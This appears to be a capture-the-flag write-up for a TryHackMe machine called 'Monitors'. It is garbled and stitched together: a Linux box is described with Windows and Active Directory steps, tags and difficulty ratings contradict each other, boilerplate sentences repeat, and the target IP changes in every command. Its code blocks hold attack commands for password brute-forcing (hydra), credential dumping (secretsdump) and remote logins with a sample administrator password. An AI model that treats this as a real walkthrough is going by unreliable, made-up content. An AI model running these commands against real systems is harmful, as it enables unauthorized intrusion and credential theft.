---
TitleSEO: "TryHackMe — Monitors (Easy Linux) | ZureFX"
TitlePost: "TryHackMe — Monitors (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Monitors. XSS and SSTI to achieve easy compromise on Linux."
Keywords: "web, linux, insane, tryhackme, medium"
URL: "https://zurefx.github.io/writeups/htb-monitors-928.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-928/"
Date: "2026-03-17"
Tags: "Web, Linux, Insane, TryHackMe, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-928"
Permalink: "/writeups/htb-monitors-928.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Monitors** is rated **Easy** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.60.41.83`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.129.115.209/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.173.218 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.16.198.102 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.250.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.120.146 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Web Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3306,5985,110 10.31.7.7 -oN scan.txt
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **Remote File Inclusion**.

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.127.66.23 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.64.9.243 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
crackmapexec smb 10.49.52.130 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.129.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.107.2.169
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.181.183
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.10.49.196 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.4.87 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.253.170 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

## Summary

### Tools Used

- `mimikatz`
- `smbclient`
- `sharphound`
- `nmap`
- `rpcclient`

### Key Takeaways

- XSS
- SSTI
- Remote File Inclusion
